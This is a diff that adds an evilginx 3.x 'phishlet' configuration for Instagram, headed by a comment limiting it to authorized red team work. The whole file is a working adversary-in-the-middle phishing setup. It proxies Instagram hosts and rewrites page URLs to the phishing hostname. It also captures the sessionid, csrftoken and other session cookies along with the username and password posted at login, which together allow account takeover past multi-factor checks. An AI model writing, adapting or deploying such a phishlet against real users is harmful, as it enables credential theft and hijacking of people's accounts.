@@ -1,0 +1,46 @@
+# instagram.yaml — evilginx 3.x phishlet
+# For authorized red team engagements / security research only.
+name: 'instagram'
+author: '@yourhandle'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
+  # Static/CDN assets — Instagram serves these from FB CDN; usually leave unproxied,
+  # but if asset rewriting breaks the page, proxy selectively.
+  - {phish_sub: 'static', orig_sub: 'static.cdninstagram.com', domain: 'cdninstagram.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www.instagram.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'i.instagram.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '//instagram.com', replace: '//{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid', 'ds_user_id', 'csrftoken', 'rur', 'mid', 'ig_did']
+  - domain: 'instagram.com'
+    keys: ['sessionid', 'ds_user_id']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'enc_password'        # IG sends encrypted password in newer flows; capture as-is
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login/'
+
+force_post:
+  - path: '/api/v1/web/accounts/login/ajax/'
+    search:
+      - {key: 'username', search: '.*'}
+    force:
+      - {key: 'username', value: '{username}'}
+    type: 'post'
